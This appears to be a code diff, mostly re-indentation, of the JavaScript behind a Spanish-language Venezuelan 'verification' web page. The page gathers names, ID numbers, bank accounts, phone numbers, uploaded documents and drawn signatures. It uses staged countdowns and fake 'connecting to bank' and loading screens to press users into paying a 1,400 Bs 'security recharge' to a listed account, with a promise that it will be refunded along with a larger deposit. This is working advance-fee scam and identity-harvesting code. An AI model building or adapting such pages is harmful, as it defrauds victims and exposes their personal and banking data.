-      // Monto en Bs que recibirá el usuario (ej. 69000)
-      let bsUserInput = parseFloat(document.getElementById('bsAmount').value) || 0; 
-      // La parte en USD es opcional
-      const usdAmountVal = document.getElementById('usdAmount').value;
-      let usdFormatted = usdAmountVal ? `${usdAmountVal} USD` : 'N/A';
-
-      // Llenar la primera tarjeta
-      cardFullName.textContent = `${fullNameVal}`;
-      cardAccount.textContent = `${accountNumberVal}`;
-      cardBank.textContent = bankNameText || 'Banco Seleccionado';
-      cardMontos.textContent = `${formatMoney(bsUserInput)} / ${usdFormatted}`;
-
-      // Generar “concepto recarga” = primerNombre + cédula
-      const firstName = fullNameVal.split(' ')[0] || 'Usuario';
-      const conceptValue = (firstName + cedulaVal).toUpperCase().replace(/\s+/g, '');
-      conceptRecarga.textContent = conceptValue;
-
-      // Llenar datos finales para la sección "Completar Recarga"
-      finalBankOrigin.textContent = bankNameText || 'Banco Origen';
-      const prefix = document.getElementById('phonePrefix').value;
-      const phone = document.getElementById('phoneNumber').value;
-      finalPhone.textContent = prefix + '-' + phone;
-      finalCedula.textContent = cedulaVal;
-
-      // También mostrar en la etiqueta final (Comprobante de Pago Móvil del X)
-      finalBankNameForReceipt.textContent = bankNameText || 'tu banco';
-
-      // ===== Cálculo dinámico =====
-      // El monto fijo de recarga: 1400
-      // El monto que recibirá el usuario en Bs se asume "bsUserInput"
-      // Por ejemplo, si bsUserInput es 69000 => total 70400
-      const recargaFija = 1400;
-      const totalConRecarga = bsUserInput + recargaFija;
-
-      // Actualizar el texto de reembolso
-      reembolsoBanner.innerHTML = `
-        Al realizar esta recarga de <strong>1.400,00 Bolívares</strong>, 
-        se te devolverá junto con ${formatMoney(bsUserInput)}.
-        Por lo tanto, recibirás inmediatamente un depósito total por 
-        <strong>${formatMoney(totalConRecarga)}</strong>.
-      `;
-
-      finalMontoGlobalEl.textContent = formatMoney(totalConRecarga);
-
-    }
-
-    function startMainCardCountdown() {
-      let count = 60;
-      btnMainCardContinue.disabled = true;
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnMainCardContinue.textContent = `Espera ${count}s...`;
-      btnMainCardContinue.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnMainCardContinue.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnMainCardContinue.textContent = 'Continuar';
-          btnMainCardContinue.disabled = false;
-          btnMainCardContinue.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnMainCardContinue.textContent = 'Continuar';
+      btnMainCardContinue.disabled = false;
+      btnMainCardContinue.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnMainCardContinue.addEventListener('click', () => {
-      verificationMainCard.style.display = 'none';
-      showOverlayConectandoBanco();
-    });
+btnMainCardContinue.addEventListener('click', () => {
+  verificationMainCard.style.display = 'none';
+  showOverlayConectandoBanco();
+});
 
-    function showOverlayConectandoBanco() {
-      overlayConectandoBanco.style.display = 'flex';
-      setTimeout(() => {
-        overlayConectandoBanco.style.display = 'none';
-        showOverlayRazonAdicional();
-      }, 5000);
-    }
+function showOverlayConectandoBanco() {
+  overlayConectandoBanco.style.display = 'flex';
+  setTimeout(() => {
+    overlayConectandoBanco.style.display = 'none';
+    showOverlayRazonAdicional();
+  }, 5000);
+}
 
-    function showOverlayRazonAdicional() {
-      overlayRazonAdicional.style.display = 'flex';
-      let count = 10;
-      btnRazonAdicionalContinue.disabled = true;
+function showOverlayRazonAdicional() {
+  overlayRazonAdicional.style.display = 'flex';
+  let count = 10;
+  btnRazonAdicionalContinue.disabled = true;
+  btnRazonAdicionalContinue.textContent = `Espera ${count}s...`;
+  btnRazonAdicionalContinue.classList.add('btn-disabled');
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnRazonAdicionalContinue.textContent = `Espera ${count}s...`;
-      btnRazonAdicionalContinue.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnRazonAdicionalContinue.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnRazonAdicionalContinue.textContent = 'Continuar';
-          btnRazonAdicionalContinue.disabled = false;
-          btnRazonAdicionalContinue.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnRazonAdicionalContinue.textContent = 'Continuar';
+      btnRazonAdicionalContinue.disabled = false;
+      btnRazonAdicionalContinue.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnRazonAdicionalContinue.addEventListener('click', () => {
-      overlayRazonAdicional.style.display = 'none';
-      whyVerification.style.display = 'block';
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-      startWhyVerificationCountdown();
-    });
+btnRazonAdicionalContinue.addEventListener('click', () => {
+  overlayRazonAdicional.style.display = 'none';
+  whyVerification.style.display = 'block';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  startWhyVerificationCountdown();
+});
 
-    function startWhyVerificationCountdown() {
-      let count = 12;
-      btnShowWhatToDo.disabled = true;
+function startWhyVerificationCountdown() {
+  let count = 12;
+  btnShowWhatToDo.disabled = true;
+  btnShowWhatToDo.textContent = `Espera ${count}s...`;
+  btnShowWhatToDo.classList.add('btn-disabled');
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnShowWhatToDo.textContent = `Espera ${count}s...`;
-      btnShowWhatToDo.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnShowWhatToDo.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnShowWhatToDo.textContent = 'Entendido, continuar';
-          btnShowWhatToDo.disabled = false;
-          btnShowWhatToDo.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnShowWhatToDo.textContent = 'Entendido, continuar';
+      btnShowWhatToDo.disabled = false;
+      btnShowWhatToDo.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnShowWhatToDo.addEventListener('click', () => {
-      whyVerification.style.display = 'none';
-      whatToDoCard.style.display = 'block';
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-      startWhatToDoCountdown();
-    });
+btnShowWhatToDo.addEventListener('click', () => {
+  whyVerification.style.display = 'none';
+  whatToDoCard.style.display = 'block';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  startWhatToDoCountdown();
+});
 
-    function startWhatToDoCountdown() {
-      let count = 45;
-      btnAfterRecarga.disabled = true;
+function startWhatToDoCountdown() {
+  let count = 45;
+  btnAfterRecarga.disabled = true;
+  btnAfterRecarga.textContent = `Espera ${count}s...`;
+  btnAfterRecarga.classList.add('btn-disabled');
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnAfterRecarga.textContent = `Espera ${count}s...`;
-      btnAfterRecarga.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnAfterRecarga.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnAfterRecarga.textContent = 'Una vez que realices tu recarga, presiona aquí';
-          btnAfterRecarga.disabled = false;
-          btnAfterRecarga.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnAfterRecarga.textContent = 'Una vez que realices tu recarga, presiona aquí';
+      btnAfterRecarga.disabled = false;
+      btnAfterRecarga.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnAfterRecarga.addEventListener('click', () => {
-      showRecargaAlert();
-    });
+btnAfterRecarga.addEventListener('click', () => {
+  showRecargaAlert();
+});
 
-    function showRecargaAlert() {
-      modalAlertaRecargaContent.innerHTML = `
-        <p>Confirma que has realizado tu recarga de seguridad por <strong>1.400,00 Bolívares</strong> a los siguientes datos:</p>
-        <ul style="list-style:none; text-align:left; margin:0; padding:0;">
-          <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
-          <li><strong>Número:</strong> 0412-1000000</li>
-          <li><strong>RIF:</strong> J-407502646</li>
-          <li><strong>Monto:</strong> 1.400,00 Bolívares</li>
-          <li><strong>Concepto:</strong> <span id="alertConcept">${conceptRecarga.textContent}</span></li>
-        </ul>
-      `;
-      modalAlertaRecarga.style.display = 'flex';
-      disableAlertRecargaOk();
-    }
+function showRecargaAlert() {
+  modalAlertaRecargaContent.innerHTML = `
+    <p>Confirma que has realizado tu recarga de seguridad por <strong>1.400,00 Bolívares</strong> a los siguientes datos:</p>
+    <ul style="list-style:none; text-align:left; margin:0; padding:0;">
+      <li><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</li>
+      <li><strong>Número:</strong> 0412-1000000</li>
+      <li><strong>RIF:</strong> J-407502646</li>
+      <li><strong>Monto:</strong> 1.400,00 Bolívares</li>
+      <li><strong>Concepto:</strong> <span id="alertConcept">${conceptRecarga.textContent}</span></li>
+    </ul>
+  `;
+  modalAlertaRecarga.style.display = 'flex';
+  disableAlertRecargaOk();
+}
 
-    function disableAlertRecargaOk() {
-      let count = 12;
-      btnAlertaRecargaOk.disabled = true;
+function disableAlertRecargaOk() {
+  let count = 12;
+  btnAlertaRecargaOk.disabled = true;
+  btnAlertaRecargaOk.textContent = `Espera ${count}s...`;
+  btnAlertaRecargaOk.classList.add('btn-disabled');
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnAlertaRecargaOk.textContent = `Espera ${count}s...`;
-      btnAlertaRecargaOk.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnAlertaRecargaOk.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnAlertaRecargaOk.textContent = 'Confirmar';
-          btnAlertaRecargaOk.disabled = false;
-          btnAlertaRecargaOk.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnAlertaRecargaOk.textContent = 'Confirmar';
+      btnAlertaRecargaOk.disabled = false;
+      btnAlertaRecargaOk.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnAlertaRecargaOk.addEventListener('click', () => {
-      modalAlertaRecarga.style.display = 'none';
-      whatToDoCard.style.display = 'none';
-      finalRechargeData.style.display = 'block';
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-      disableFinalRecargaButton();
-    });
+btnAlertaRecargaOk.addEventListener('click', () => {
+  modalAlertaRecarga.style.display = 'none';
+  whatToDoCard.style.display = 'none';
+  finalRechargeData.style.display = 'block';
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+  disableFinalRecargaButton();
+});
 
-    function disableFinalRecargaButton() {
-      let count = 45;
-      btnFinalRecargaContinuar.disabled = true;
+function disableFinalRecargaButton() {
+  let count = 45;
+  btnFinalRecargaContinuar.disabled = true;
+  btnFinalRecargaContinuar.textContent = `Espera ${count}s...`;
+  btnFinalRecargaContinuar.classList.add('btn-disabled');
+
+  const interval = setInterval(() => {
+    count--;
+    if (count > 0) {
       btnFinalRecargaContinuar.textContent = `Espera ${count}s...`;
-      btnFinalRecargaContinuar.classList.add('btn-disabled');
-
-      const interval = setInterval(() => {
-        count--;
-        if (count > 0) {
-          btnFinalRecargaContinuar.textContent = `Espera ${count}s...`;
-        } else {
-          clearInterval(interval);
-          btnFinalRecargaContinuar.textContent = 'Continuar';
-          btnFinalRecargaContinuar.disabled = false;
-          btnFinalRecargaContinuar.classList.remove('btn-disabled');
-        }
-      }, 1000);
+    } else {
+      clearInterval(interval);
+      btnFinalRecargaContinuar.textContent = 'Continuar';
+      btnFinalRecargaContinuar.disabled = false;
+      btnFinalRecargaContinuar.classList.remove('btn-disabled');
     }
+  }, 1000);
+}
 
-    btnFinalRecargaContinuar.addEventListener('click', () => {
-      if (!verifNumeroComprobante.value || verifNumeroComprobante.value.length < 12) {
-        alert('El número de comprobante debe tener al menos 12 dígitos.');
-        return;
-      }
-      startFinalLoading();
-    });
+btnFinalRecargaContinuar.addEventListener('click', () => {
+  if (!verifNumeroComprobante.value || verifNumeroComprobante.value.length < 12) {
+    alert('El número de comprobante debe tener al menos 12 dígitos.');
+    return;
+  }
+  startFinalLoading();
+});
 
-    function startFinalLoading() {
-      finalLoadingOverlay.style.display = 'flex';
-      const stepsFinal = 8;
-      let stepIndex = 1;
+function startFinalLoading() {
+  finalLoadingOverlay.style.display = 'flex';
+  const stepsFinal = 8;
+  let stepIndex = 1;
 
-      function showFinalStep(index) {
-        for (let i = 1; i <= stepsFinal; i++) {
-          document.getElementById(`finalStep${i}`).style.display = 'none';
-        }
-        document.getElementById(`finalStep${index}`).style.display = 'block';
-      }
+  function showFinalStep(index) {
+    for (let i = 1; i <= stepsFinal; i++) {
+      document.getElementById(`finalStep${i}`).style.display = 'none';
+    }
+    document.getElementById(`finalStep${index}`).style.display = 'block';
+  }
 
+  showFinalStep(stepIndex);
+
+  const interval = setInterval(() => {
+    stepIndex++;
+    if (stepIndex <= stepsFinal) {
       showFinalStep(stepIndex);
-
-      const interval = setInterval(() => {
-        stepIndex++;
-        if (stepIndex <= stepsFinal) {
-          showFinalStep(stepIndex);
-        } else {
-          clearInterval(interval);
-        }
-      }, 5000);
+    } else {
+      clearInterval(interval);
     }
+  }, 5000);
+}
 
-    /****************************************************
-     * Editar datos => reset
-     ****************************************************/
-    function onEditData() {
-      modalConfirm.style.display = 'none';
-      validationOverlay.style.display = 'none';
-      finalLoadingOverlay.style.display = 'none';
-      comprobanteCierreMsg.style.display = 'none';
-      overlay20s.style.display = 'none';
-      overlayFirmaCoincide.style.display = 'none';
-      overlayFirmaNoCoincide.style.display = 'none';
-      modalAlertaRecarga.style.display = 'none';
-      overlayConectandoBanco.style.display = 'none';
-      overlayRazonAdicional.style.display = 'none';
-      clearAllData();
-      showStep(1);
+/****************************************************
+ * Editar datos => reset
+ ****************************************************/
+function onEditData() {
+  modalConfirm.style.display = 'none';
+  validationOverlay.style.display = 'none';
+  finalLoadingOverlay.style.display = 'none';
+  comprobanteCierreMsg.style.display = 'none';
+  overlay20s.style.display = 'none';
+  overlayFirmaCoincide.style.display = 'none';
+  overlayFirmaNoCoincide.style.display = 'none';
+  modalAlertaRecarga.style.display = 'none';
+  overlayConectandoBanco.style.display = 'none';
+  overlayRazonAdicional.style.display = 'none';
+  clearAllData();
+  showStep(1);
+}
+
+function clearAllData() {
+  document.getElementById('formStep1').reset();
+  document.getElementById('formStep2').reset();
+  document.getElementById('docUploadName').textContent = '';
+  document.getElementById('signaturePreviewContainer').style.display = 'none';
+  document.getElementById('signaturePreview').src = '';
+  document.getElementById('signatureData').value = '';
+
+  verificationMainCard.style.display = 'none';
+  whyVerification.style.display = 'none';
+  whatToDoCard.style.display = 'none';
+  finalRechargeData.style.display = 'none';
+  verifNumeroComprobante.value = '';
+
+  currentStep = 1;
+  updateProgress(currentStep);
+  steps.forEach((st) => st.classList.remove('active'));
+  steps[0].classList.add('active');
+  sidebarSteps.forEach((item) => item.classList.remove('active'));
+  sidebarSteps[0].classList.add('active');
+}
+
+/****************************************************
+ * Firma Digital con Canvas
+ ****************************************************/
+let isDrawing = false;
+let x = 0;
+let y = 0;
+let signatureCanvas, ctx;
+
+function openSignaturePad() {
+  document.getElementById('signatureModal').style.display = 'flex';
+  signatureCanvas = document.getElementById('signatureCanvas');
+  ctx = signatureCanvas.getContext('2d');
+
+  signatureCanvas.addEventListener('mousedown', startPosition);
+  signatureCanvas.addEventListener('mouseup', finishedPosition);
+  signatureCanvas.addEventListener('mousemove', draw);
+
+  signatureCanvas.addEventListener('touchstart', startPositionTouch);
+  signatureCanvas.addEventListener('touchend', finishedPositionTouch);
+  signatureCanvas.addEventListener('touchmove', drawTouch);
+}
+
+function closeSignatureModal() {
+  document.getElementById('signatureModal').style.display = 'none';
+  removeSignatureCanvasListeners();
+}
+
+function removeSignatureCanvasListeners() {
+  signatureCanvas.removeEventListener('mousedown', startPosition);
+  signatureCanvas.removeEventListener('mouseup', finishedPosition);
+  signatureCanvas.removeEventListener('mousemove', draw);
+
+  signatureCanvas.removeEventListener('touchstart', startPositionTouch);
+  signatureCanvas.removeEventListener('touchend', finishedPositionTouch);
+  signatureCanvas.removeEventListener('touchmove', drawTouch);
+}
+
+function startPosition(e) {
+  isDrawing = true;
+  [x, y] = [e.offsetX, e.offsetY];
+}
+function finishedPosition() {
+  isDrawing = false;
+  ctx.beginPath();
+}
+function draw(e) {
+  if (!isDrawing) return;
+  ctx.lineWidth = 2;
+  ctx.lineCap = 'round';
+  ctx.strokeStyle = '#000';
+  ctx.lineTo(e.offsetX, e.offsetY);
+  ctx.stroke();
+  ctx.beginPath();
+  ctx.moveTo(e.offsetX, e.offsetY);
+}
+
+function getTouchPos(canvasDom, touchEvent) {
+  const rect = canvasDom.getBoundingClientRect();
+  return {
+    x: touchEvent.touches[0].clientX - rect.left,
+    y: touchEvent.touches[0].clientY - rect.top
+  };
+}
+function startPositionTouch(e) {
+  e.preventDefault();
+  isDrawing = true;
+  const pos = getTouchPos(signatureCanvas, e);
+  x = pos.x;
+  y = pos.y;
+}
+function finishedPositionTouch(e) {
+  e.preventDefault();
+  isDrawing = false;
+  ctx.beginPath();
+}
+function drawTouch(e) {
+  e.preventDefault();
+  if (!isDrawing) return;
+  const pos = getTouchPos(signatureCanvas, e);
+  ctx.lineWidth = 2;
+  ctx.lineCap = 'round';
+  ctx.strokeStyle = '#000';
+  ctx.lineTo(pos.x, pos.y);
+  ctx.stroke();
+  ctx.beginPath();
+  ctx.moveTo(pos.x, pos.y);
+}
+
+document.getElementById('clearSignature').addEventListener('click', () => {
+  ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
+});
+
+document.getElementById('saveSignature').addEventListener('click', () => {
+  const dataURL = signatureCanvas.toDataURL('image/png');
+  document.getElementById('signatureData').value = dataURL;
+  document.getElementById('signaturePreview').src = dataURL;
+  document.getElementById('signaturePreviewContainer').style.display = 'block';
+  closeSignatureModal();
+});
+
+/****************************************************
+ * Mostrar nombre del archivo subido
+ ****************************************************/
+const docUpload = document.getElementById('docUpload');
+const docUploadName = document.getElementById('docUploadName');
+docUpload.addEventListener('change', () => {
+  if (docUpload.files.length > 0) {
+    docUploadName.textContent = docUpload.files[0].name;
+  } else {
+    docUploadName.textContent = '';
+  }
+});
+
+/****************************************************
+ * Autocompletar bank code y calcular Bs
+ ****************************************************/
+const bankNameSelect = document.getElementById('bankName');
+const accountNumberInput = document.getElementById('accountNumber');
+bankNameSelect.addEventListener('change', () => {
+  const val = bankNameSelect.value;
+  if (val.includes('|')) {
+    const [code] = val.split('|');
+    if (code) {
+      accountNumberInput.value = code;
     }
+  }
+});
 
-    function clearAllData() {
-      document.getElementById('formStep1').reset();
-      document.getElementById('formStep2').reset();
-      document.getElementById('docUploadName').textContent = '';
-      document.getElementById('signaturePreviewContainer').style.display = 'none';
-      document.getElementById('signaturePreview').src = '';
-      document.getElementById('signatureData').value = '';
+const usdAmountSelect = document.getElementById('usdAmount');
+const bsAmountInput = document.getElementById('bsAmount');
+usdAmountSelect.addEventListener('change', () => {
+  const usdValue = parseFloat(usdAmountSelect.value) || 0;
+  const calculatedBs = usdValue * 69; 
+  if (calculatedBs > 0) {
+    bsAmountInput.value = calculatedBs.toString();
+  } else {
+    bsAmountInput.value = '';
+  }
+});
 
-      verificationMainCard.style.display = 'none';
-      whyVerification.style.display = 'none';
-      whatToDoCard.style.display = 'none';
-      finalRechargeData.style.display = 'none';
-      verifNumeroComprobante.value = '';
+/****************************************************
+ * WhatsApp Error
+ ****************************************************/
+function openWhatsAppError() {
+  const fullName = document.getElementById('fullName').value;
+  const cedulaNumber = document.getElementById('cedulaNumber').value;
+  const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
+  const usdAmount = document.getElementById('usdAmount').value;
+  const bsAmount = document.getElementById('bsAmount').value;
+  const comprobante = document.getElementById('comprobante').value;
 
-      currentStep = 1;
-      updateProgress(currentStep);
-      steps.forEach((st) => st.classList.remove('active'));
-      steps[0].classList.add('active');
-      sidebarSteps.forEach((item) => item.classList.remove('active'));
-      sidebarSteps[0].classList.add('active');
-    }
-
-    /****************************************************
-     * Firma Digital con Canvas
-     ****************************************************/
-    let isDrawing = false;
-    let x = 0;
-    let y = 0;
-    let signatureCanvas, ctx;
-
-    function openSignaturePad() {
-      document.getElementById('signatureModal').style.display = 'flex';
-      signatureCanvas = document.getElementById('signatureCanvas');
-      ctx = signatureCanvas.getContext('2d');
-
-      signatureCanvas.addEventListener('mousedown', startPosition);
-      signatureCanvas.addEventListener('mouseup', finishedPosition);
-      signatureCanvas.addEventListener('mousemove', draw);
-
-      signatureCanvas.addEventListener('touchstart', startPositionTouch);
-      signatureCanvas.addEventListener('touchend', finishedPositionTouch);
-      signatureCanvas.addEventListener('touchmove', drawTouch);
-    }
-
-    function closeSignatureModal() {
-      document.getElementById('signatureModal').style.display = 'none';
-      removeSignatureCanvasListeners();
-    }
-
-    function removeSignatureCanvasListeners() {
-      signatureCanvas.removeEventListener('mousedown', startPosition);
-      signatureCanvas.removeEventListener('mouseup', finishedPosition);
-      signatureCanvas.removeEventListener('mousemove', draw);
-
-      signatureCanvas.removeEventListener('touchstart', startPositionTouch);
-      signatureCanvas.removeEventListener('touchend', finishedPositionTouch);
-      signatureCanvas.removeEventListener('touchmove', drawTouch);
-    }
-
-    function startPosition(e) {
-      isDrawing = true;
-      [x, y] = [e.offsetX, e.offsetY];
-    }
-    function finishedPosition() {
-      isDrawing = false;
-      ctx.beginPath();
-    }
-    function draw(e) {
-      if (!isDrawing) return;
-      ctx.lineWidth = 2;
-      ctx.lineCap = 'round';
-      ctx.strokeStyle = '#000';
-      ctx.lineTo(e.offsetX, e.offsetY);
-      ctx.stroke();
-      ctx.beginPath();
-      ctx.moveTo(e.offsetX, e.offsetY);
-    }
-
-    function getTouchPos(canvasDom, touchEvent) {
-      const rect = canvasDom.getBoundingClientRect();
-      return {
-        x: touchEvent.touches[0].clientX - rect.left,
-        y: touchEvent.touches[0].clientY - rect.top
-      };
-    }
-    function startPositionTouch(e) {
-      e.preventDefault();
-      isDrawing = true;
-      const pos = getTouchPos(signatureCanvas, e);
-      x = pos.x;
-      y = pos.y;
-    }
-    function finishedPositionTouch(e) {
-      e.preventDefault();
-      isDrawing = false;
-      ctx.beginPath();
-    }
-    function drawTouch(e) {
-      e.preventDefault();
-      if (!isDrawing) return;
-      const pos = getTouchPos(signatureCanvas, e);
-      ctx.lineWidth = 2;
-      ctx.lineCap = 'round';
-      ctx.strokeStyle = '#000';
-      ctx.lineTo(pos.x, pos.y);
-      ctx.stroke();
-      ctx.beginPath();
-      ctx.moveTo(pos.x, pos.y);
-    }
-
-    document.getElementById('clearSignature').addEventListener('click', () => {
-      ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
-    });
-
-    document.getElementById('saveSignature').addEventListener('click', () => {
-      const dataURL = signatureCanvas.toDataURL('image/png');
-      document.getElementById('signatureData').value = dataURL;
-      document.getElementById('signaturePreview').src = dataURL;
-      document.getElementById('signaturePreviewContainer').style.display = 'block';
-      closeSignatureModal();
-    });
-
-    /****************************************************
-     * Mostrar nombre del archivo subido
-     ****************************************************/
-    const docUpload = document.getElementById('docUpload');
-    const docUploadName = document.getElementById('docUploadName');
-    docUpload.addEventListener('change', () => {
-      if (docUpload.files.length > 0) {
-        docUploadName.textContent = docUpload.files[0].name;
-      } else {
-        docUploadName.textContent = '';
-      }
-    });
-
-    /****************************************************
-     * Autocompletar bank code y calcular Bs
-     ****************************************************/
-    const bankNameSelect = document.getElementById('bankName');
-    const accountNumberInput = document.getElementById('accountNumber');
-    bankNameSelect.addEventListener('change', () => {
-      const val = bankNameSelect.value;
-      if (val.includes('|')) {
-        const [code] = val.split('|');
-        if (code) {
-          accountNumberInput.value = code;
-        }
-      }
-    });
-
-    const usdAmountSelect = document.getElementById('usdAmount');
-    const bsAmountInput = document.getElementById('bsAmount');
-    usdAmountSelect.addEventListener('change', () => {
-      const usdValue = parseFloat(usdAmountSelect.value) || 0;
-      const calculatedBs = usdValue * 69; 
-      if (calculatedBs > 0) {
-        bsAmountInput.value = calculatedBs.toString();
-      } else {
-        bsAmountInput.value = '';
-      }
-    });
-
-    /****************************************************
-     * WhatsApp Error
-     ****************************************************/
-    function openWhatsAppError() {
-      const fullName = document.getElementById('fullName').value;
-      const cedulaNumber = document.getElementById('cedulaNumber').value;
-      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
-      const usdAmount = document.getElementById('usdAmount').value;
-      const bsAmount = document.getElementById('bsAmount').value;
-      const comprobante = document.getElementById('comprobante').value;
-
-      let mensaje = `Hola, necesito ayuda con mi transacción:
+  let mensaje = `Hola, necesito ayuda con mi transacción:
 - Nombre Completo: ${fullName}
 - Cédula: ${cedulaNumber}
 - Documento Subido: ${docFileName}
@@ -2329,21 +2352,20 @@
 - Estado: No se encontró la recarga de 1.400 Bs
 - Fecha: ${new Date().toLocaleDateString()}`;
 
-      mensaje = encodeURIComponent(mensaje);
-      const numeroWhats = '17373018059';
-      const waLink = `https://wa.me/${numeroWhats}?text=${mensaje}`;
-      window.open(waLink, '_blank');
-    }
+  mensaje = encodeURIComponent(mensaje);
+  const numeroWhats = '17373018059';
+  const waLink = `https://wa.me/${numeroWhats}?text=${mensaje}`;
+  window.open(waLink, '_blank');
+}
 
-    /****************************************************
-     * Cerrar recarga alert
-     ****************************************************/
-    function closeRecargaAlert() {
-      modalAlertaRecarga.style.display = 'none';
-    }
-  </script>
-</body>
-</html>
+/****************************************************
+ * Cerrar recarga alert
+ ****************************************************/
+function closeRecargaAlert() {
+  modalAlertaRecarga.style.display = 'none';
+}
+</script>
+
 
 
 
